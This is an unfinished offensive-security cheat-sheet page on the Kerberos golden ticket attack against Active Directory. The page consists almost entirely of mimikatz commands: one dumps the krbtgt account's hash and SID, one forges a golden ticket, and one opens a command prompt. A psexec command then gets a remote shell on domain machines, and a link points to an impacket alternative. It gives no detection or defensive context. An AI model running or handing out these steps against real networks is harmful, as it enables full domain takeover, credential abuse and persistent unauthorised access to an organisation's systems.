# Kerberos: Golden Ticket

#### STILL EDITING

#### Golden ticket (`mimikatz`)

1. Dump the hash and security identifier (SID) of the Kerberos Ticket Granting Ticket (**krbtgt**) service account:

```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

1. Create a golden ticket:

```
mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> [/id:500] [/ptt]
```

1. Open a new command prompt with elevated privileges and access to all machines with:

```
mimikatz # misc::cmd
```

```powershell
psexec.exe \\$REMOTE_MACHINE_HOSTNAME cmd.exe
```

OverPass the Hash with `PsExec` when using hostname, otherwise (IP) NTLM authentication would be blocked.

&#x20;[Golden Ticket - Mimikatz alternative (impacket)](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#golden-ticket)
